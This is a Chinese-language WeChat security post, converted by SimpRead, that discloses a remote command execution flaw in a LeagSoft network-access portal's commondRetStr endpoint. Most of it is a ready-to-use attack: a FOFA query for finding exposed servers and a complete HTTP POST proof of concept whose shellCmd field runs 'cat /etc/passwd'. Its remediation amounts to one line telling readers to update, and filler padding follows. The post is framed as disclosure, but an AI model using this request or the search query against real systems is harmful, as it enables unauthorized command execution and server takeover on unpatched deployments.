<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qEkGI9TXlzVFFet899l_Vw)

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCBW0oRLickDlwBXcvdg0O19gnebUeltmibDpIdnE7pZS608XbClUn5GruVUKjqWFhIQlyk0Bzjs5N8g/640?wx_fmt=png)

0x01 漏洞描述

联软科技安全准入门户平台 commondRetStr 处存在远程代码执行漏洞，攻击者可以获取服务器权限。

0x02 影响平台

```
联软准入平台

```

0x03 漏洞复现

FOFA 空间搜索引擎语句  

```
"UniSSOView"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCByFeT5z0B49hAJd5E4jcCVlsu6dAtp2ybMn77IR15lcvR2kxZZicn1fm6pviaAsicdlzI6TcoEsIJfw/640?wx_fmt=png)

登录页面是这个酱紫

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCByFeT5z0B49hAJd5E4jcCV4BWVcWfXQhY0V97KD25lrbxaCJLRHgdUeyE1NG1qRZzWPtypGCia7dQ/640?wx_fmt=png)

PoC：

```
POST /TunnelGateway/commondRetStr HTTP/1.1
Host: ip:port
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
shellCmd=cat /etc/passwd

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCByFeT5z0B49hAJd5E4jcCVQKOtV6Fcxg1n5SHl67icV7F3EP8D8Dibw06ic1lia3Dr2UL9wfs8hzuuWQ/640?wx_fmt=png)

0x04 修复方案

```
建议及时更新官方补丁：
http://hjsoft.com.cn/

```

觉得内容不错，就点下 “_**赞**_” 和 “_**在看**_”_**  
如侵权请私聊公众号删文**_

_**=========================  
**_

_**凑字数凑字数**_

_**_**凑字数凑字数**_**_

_**__**凑字数凑字数**__**_

_**__**_**凑字数凑字数**_**__**_

_**__**_**_**凑字数凑字数**_**_**__**_

_**__**_**_**_**凑字数凑字数**_**_**_**__**_

_**__**_**_**_**_**凑字数凑字数**_**_**_**_**__**_

_**__**_**_**_**_**_**凑字数凑字数**_**凑字数凑字数**__**_**_**_**_**__**_

_**__**_**_**_**_**___**凑字数凑字数**_**凑字数凑字数**____**_**_**_**_**__**_

_**__**_**_**_**_**____**_**凑字数凑字数**_**凑字数凑字数**__**____**_**_**_**_**__**_

_**__**_**_**_**_**____**___**凑字数凑字数**___**____**_**_**_**_**__**_

_**__**_**_**_**_**____**___**凑字数凑字数**___**____**_**_**_**_**__**_

_**__**_**_**_**_**____**____**凑字数凑字数**____**____**_**_**_**_**__**_

_**__**_**_**_**_**____**_____**凑字数凑字数**_____**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**凑字数凑字数**______**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**_**凑字数凑字数**_**______**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**__**凑字数凑字数**__**______**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**___**=========================**___**______**____**_**_**_**_**__**_